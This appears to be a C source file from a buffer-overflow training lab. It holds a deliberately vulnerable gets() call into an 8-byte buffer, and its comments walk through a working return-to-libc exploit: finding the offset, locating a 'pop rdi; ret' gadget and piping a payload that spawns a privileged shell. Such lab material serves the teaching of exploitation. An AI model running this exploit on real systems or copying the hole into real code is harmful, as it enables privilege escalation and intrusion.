// AFTER => bof8.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION OFF
// EXPLOIT
// # FIND distance FROM buf TO return address
//     pwndbg> i r rsp      # AT STARTING VULN FUNCTION
//          rsp : 0x7fffffffe628
//     pwndbg> nextcall     # UNTIL gets FUNCTION
//     pwndbg> i r rdi      # CHECK FIRST ARGUMENT of gets FUNCTION
//          rdi : 0x7fffffffe610
//     pwndbg> p/d 0x7fffffffe628 - 0x7fffffffe610
//          $2 = 24
// --------------------------------------------------------
// # FIND address of "pop rdi ; ret" gadget
//     $ ldd bof9           # CHECK library used by bof9
//     $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
//          0x0000000000021102 : pop rdi ; ret
//          0x0000000000021102 : pop rdi ; ret
//     pwndbg> vmmap
//          0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
//     pwndbg> p/x 0x0000000000021102 + 0x7ffff7a0d000
//          $1 = 0x7ffff7a2e102
// --------------------------------------------------------
// # MAKE payload
//     payload : [dummy byte (24)] + ["pop rdi ; ret" (8)] + ["/bin/sh" (8)] + [system (8)]
//          $ (python -c "print 'x'*24+'\x02\xe1\xa2\xf7\xff\x7f\x00\x00'+'\x57\x9d\xb9\xf7\xff\x7f\x00\x00'+'\x90\x23\xa5\xf7\xff\x7f\x00\x00'";cat) | ./bof9

char * binsh = "/bin/sh";

void vuln(void) {
    char buf[BUF_SIZE];

    if (setreuid(UID_BOF10, UID_BOF10)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(UID_BOF10, UID_BOF10)) {
        perror("setgid");
        exit(1);
    }
    printf("system:%p\n", system);
    printf("binsh:%p\n", binsh);
    gets(buf);
    printf("Hello %s!\n", buf);
}

int main(void) {
    vuln();
    return 0;
}
